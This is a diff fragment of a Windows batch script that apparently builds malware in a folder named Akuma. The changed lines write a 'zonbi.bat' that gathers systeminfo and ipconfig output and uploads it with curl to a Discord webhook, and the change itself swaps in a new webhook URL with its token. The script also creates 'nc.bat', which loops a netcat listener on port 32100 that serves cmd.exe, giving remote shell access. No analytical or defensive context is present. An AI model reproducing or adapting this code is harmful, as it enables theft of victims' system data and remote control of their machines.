@@ -13,7 +13,7 @@ cd %homedrive%\Akuma
 echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo ipconfig /all ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
-echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\Akuma\systeminfo.txt" -F "content=zombi" https://discord.com/api/webhooks/1165910868031197255/h9_Fo0Wm3rs8oeVYh0OjZpEcLikL4AysneV7u3fW553KFjRlBeC-KnzGJmTJoZnGzQwB >> %homedrive%\Akuma\zonbi.bat
+echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\Akuma\systeminfo.txt" -F "content=zombi" https://discord.com/api/webhooks/1169439326988411011/KfTclOjQxXCRVbxZtpmyiePMZvF6CpqrFzAXj7-XFQukq_ZrSEa_zT4dfw3mWdwGWfGy >> %homedrive%\Akuma\zonbi.bat
 echo :loop >> %homedrive%\Akuma\nc.bat
 echo %homedrive%\Akuma\nc\nc.exe -lvp 32100 -e cmd.exe >> %homedrive%\Akuma\nc.bat
 echo goto loop >> %homedrive%\Akuma\nc.bat
